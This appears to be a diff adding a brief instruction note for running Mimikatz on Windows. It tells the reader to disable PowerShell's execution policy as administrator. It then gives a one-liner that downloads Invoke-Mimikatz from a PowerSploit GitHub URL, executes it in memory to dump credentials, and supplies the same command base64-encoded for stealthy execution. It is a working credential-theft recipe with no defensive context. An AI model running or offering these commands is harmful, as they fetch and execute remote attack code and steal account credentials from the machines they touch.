@@ -1,0 +1,14 @@
+Open Powershell as Administrator
+run "set-executionpolicy bypass" 
+validate that the policy is on bypass with "get-executionpolicy"
+
+Once done - run either of the below
+
+####
+actual encoded command: 
+
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+#####
+
+powershell.exe -encodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzACIA
